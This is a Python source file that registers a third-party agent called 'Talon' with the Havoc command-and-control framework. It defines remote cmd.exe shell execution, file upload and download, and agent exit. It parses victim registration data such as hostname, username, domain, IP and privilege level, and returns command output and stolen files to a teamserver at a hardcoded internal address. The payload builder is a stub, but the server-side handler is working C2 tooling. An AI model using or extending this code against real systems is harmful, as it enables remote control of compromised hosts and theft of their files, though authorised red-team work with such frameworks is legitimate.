from base64 import b64decode

from havoc.service import HavocService
from havoc.agent import *

COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102
COMMAND_SHELL            = 0x152
COMMAND_UPLOAD           = 0x153
COMMAND_DOWNLOAD         = 0x154
COMMAND_EXIT             = 0x155
COMMAND_OUTPUT           = 0x200

# ====================
# ===== Commands =====
# ====================
class CommandShell(Command):
    CommandId = COMMAND_SHELL
    Name = "shell"
    Description = "executes commands using cmd.exe"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( "c:\windows\system32\cmd.exe /c " + arguments[ 'commands' ] )

        return Task.buffer

class CommandUpload( Command ):
    CommandId   = COMMAND_UPLOAD
    Name        = "upload"
    Description = "uploads a file to the host"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="local_file",
            is_file_path=True,
            is_optional=False
        ),

        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        
        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]
        fileData    = b64decode( arguments[ 'local_file' ] )

        Task.add_int( self.CommandId )
        Task.add_data( remote_file )
        Task.add_data( fileData )

        return Task.buffer

class CommandDownload( Command ):
    CommandId   = COMMAND_DOWNLOAD
    Name        = "download"
    Description = "downloads the requested file"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        ),
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        
        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]

        Task.add_int( self.CommandId )
        Task.add_data( remote_file )

        return Task.buffer

class CommandExit( Command ):
    CommandId   = COMMAND_EXIT
    Name        = "exit"
    Description = "tells the talon agent to exit"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:

        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer

# =======================
# ===== Agent Class =====
# =======================
class Talon(AgentType):
    Name = "Talon"
    Author = "@C5pider"
    Version = "0.1"
    Description = f"""Talon 3rd party agent for Havoc"""
    MagicValue = 0x616c6f6e # 'talon'

    Arch = [
        "x64",
        "x86",
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe",
        },
    ]

    BuildingConfig = {
        "Sleep": "10"
    }

    Commands = [
        CommandShell(),
        CommandUpload(),
        CommandDownload(),
        CommandExit(),
    ]

    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function. 
    def generate( self, config: dict ) -> None:

        print( f"config: {config}" )

        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong). 
        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        # build_send_payload. this function send back your generated payload 
        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".bin", "test bytes".encode('utf-8') ) # this is just an example. 

    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function. 
    def response( self, response: dict ) -> bytes:

        agent_header    = response[ "AgentHeader" ]
        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request. 
        response_parser = Parser( agent_response, len(agent_response) )
        Command         = response_parser.parse_int()

        if response[ "Agent" ] == None:
            # so when the Agent field is empty this either means that the agent doesn't exists. 

            if Command == COMMAND_REGISTER:
                print( "[*] Is agent register request" )

                # Register info:
                #   - AgentID           : int [needed]
                #   - Hostname          : str [needed]
                #   - Username          : str [needed]
                #   - Domain            : str [optional]
                #   - InternalIP        : str [needed]
                #   - Process Path      : str [needed]
                #   - Process Name      : str [needed]
                #   - Process ID        : int [needed]
                #   - Process Parent ID : int [optional]
                #   - Process Arch      : str [needed]
                #   - Process Elevated  : int [needed]
                #   - OS Build          : str [needed]
                #   - OS Version        : str [needed]
                #   - OS Arch           : str [optional]
                #   - Sleep             : int [optional]

                RegisterInfo = {
                    "AgentID"           : response_parser.parse_int(),
                    "Hostname"          : response_parser.parse_str(),
                    "Username"          : response_parser.parse_str(),
                    "Domain"            : response_parser.parse_str(),
                    "InternalIP"        : response_parser.parse_str(),
                    "Process Path"      : response_parser.parse_str(),
                    "Process ID"        : str(response_parser.parse_int()),
                    "Process Parent ID" : str(response_parser.parse_int()),
                    "Process Arch"      : response_parser.parse_int(),
                    "Process Elevated"  : response_parser.parse_int(),
                    "OS Build"          : str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()), # (MajorVersion).(MinorVersion).(ProductType).(ServicePackMajor).(BuildNumber)
                    "OS Arch"           : response_parser.parse_int(),
                    "Sleep"             : response_parser.parse_int(),
                }

                RegisterInfo[ "Process Name" ] = RegisterInfo[ "Process Path" ].split( "\\" )[-1]

                # this OS info is going to be displayed on the GUI Session table. 
                RegisterInfo[ "OS Version" ] = RegisterInfo[ "OS Build" ] # "Windows Some version"

                if RegisterInfo[ "OS Arch" ] == 0:
                    RegisterInfo[ "OS Arch" ] = "x86"
                elif RegisterInfo[ "OS Arch" ] == 9:
                    RegisterInfo[ "OS Arch" ] = "x64/AMD64"
                elif RegisterInfo[ "OS Arch" ] == 5:
                    RegisterInfo[ "OS Arch" ] = "ARM"
                elif RegisterInfo[ "OS Arch" ] == 12:
                    RegisterInfo[ "OS Arch" ] = "ARM64"
                elif RegisterInfo[ "OS Arch" ] == 6:
                    RegisterInfo[ "OS Arch" ] = "Itanium-based"
                else:
                    RegisterInfo[ "OS Arch" ] = "Unknown (" + RegisterInfo[ "OS Arch" ] + ")"

                # Process Arch
                if RegisterInfo[ "Process Arch" ] == 0:
                    RegisterInfo[ "Process Arch" ] = "Unknown"

                elif RegisterInfo[ "Process Arch" ] == 1: 
                    RegisterInfo[ "Process Arch" ] = "x86"

                elif RegisterInfo[ "Process Arch" ] == 2: 
                    RegisterInfo[ "Process Arch" ] = "x64"

                elif RegisterInfo[ "Process Arch" ] == 3: 
                    RegisterInfo[ "Process Arch" ] = "IA64"

                self.register( agent_header, RegisterInfo )

                return RegisterInfo[ 'AgentID' ].to_bytes( 4, 'little' ) # return the agent id to the agent

            else:
                print( "[-] Is not agent register request" )
        else:
            print( f"[*] Something else: {Command}" )

            AgentID = response[ "Agent" ][ "NameID" ]

            if Command == COMMAND_GET_JOB:
                print( "[*] Get list of jobs and return it." )

                Tasks = self.get_task_queue( response[ "Agent" ] )

                # if there is no job just send back a COMMAND_NO_JOB command. 
                if len(Tasks) == 0:
                    Tasks = COMMAND_NO_JOB.to_bytes( 4, 'little' )
                
                print( f"Tasks: {Tasks.hex()}" )
                return Tasks

            elif Command == COMMAND_OUTPUT:

                # print(response_parser.length)
                # print(response_parser.buffer)
                # #cmdlen = struct.unpack( ">i", start )
                # cmdout = response_parser.buffer[4:]
                # #print(len(cmdout))
                # #print(response_parser.length)
                # cmdout_utf8 = cmdout.decode('gbk').encode('utf-8')
                # start = pack( ">i", len(cmdout_utf8) )
                # response_parser.length=response_parser.length-len(cmdout)+len(cmdout_utf8)
                # response_parser.buffer=start+cmdout_utf8
                # print(response_parser.length)
                # print(response_parser.buffer)

                Output = response_parser.parse_str()
                print( "[*] Output: \n" + Output )

                self.console_message( AgentID, "Good", "Received Output:", Output )

            elif Command == COMMAND_UPLOAD:

                FileSize = response_parser.parse_int()
                FileName = response_parser.parse_str()

                self.console_message( AgentID, "Good", f"File was uploaded: {FileName} ({FileSize} bytes)", "" )

            elif Command == COMMAND_DOWNLOAD:

                FileName    = response_parser.parse_str()
                FileContent = response_parser.parse_bytes()

                self.console_message( AgentID, "Good", f"File was downloaded: {FileName} ({len(FileContent)} bytes)", "" )
                
                self.download_file( AgentID, FileName, len(FileContent), FileContent )

            else:
                self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )

        return b''


def main():
    Havoc_Talon = Talon()

    print( "[*] Connect to Havoc service api" )
    Havoc_Service = HavocService(
        endpoint="ws://10.1.2.131:40056/service-endpoint",
        password="service-password"
    )
     
    print( "[*] Register Talon to Havoc" )
    Havoc_Service.register_agent(Havoc_Talon)

    return


if __name__ == '__main__':
    main()
